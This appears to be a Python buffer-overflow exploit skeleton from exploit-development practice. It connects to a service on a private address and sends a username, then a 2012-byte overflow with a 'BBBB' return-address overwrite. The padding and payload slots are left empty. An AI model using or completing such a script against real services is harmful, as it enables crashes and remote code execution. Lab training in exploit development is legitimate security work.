import socket
import sys

ip = "172.20.192.1"
port = 9999
timeout = 5

offset = 2012
overflow = "A" * offset
retn = "BBBB"
padding = ""
payload = ""

buffer = overflow + retn + padding + payload

username = "user"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        
        # Receive initial server output (welcome + username prompt)
        initial = s.recv(1024)
        print(f"Server (initial): {initial.decode('latin-1', errors='replace')}")
        
        s.sendall(bytes(username + "\n", "latin-1"))  # Send username
        
        # Receive message prompt
        message_prompt = s.recv(1024)
        print(f"Server (message prompt): {message_prompt.decode('latin-1', errors='replace')}")
        
        print(f"Sending evil buffer of {len(buffer)} bytes...")
        s.sendall(bytes(buffer + "\n", "latin-1"))  # Send buffer as message
        
        # Receive server response
        response = s.recv(1024)
        print(f"Server (response): {response.decode('latin-1', errors='replace')}")
        print("Done!")
except Exception as e:
    print("Could not connect or server crashed.")
    print(f"Exception: {e}")
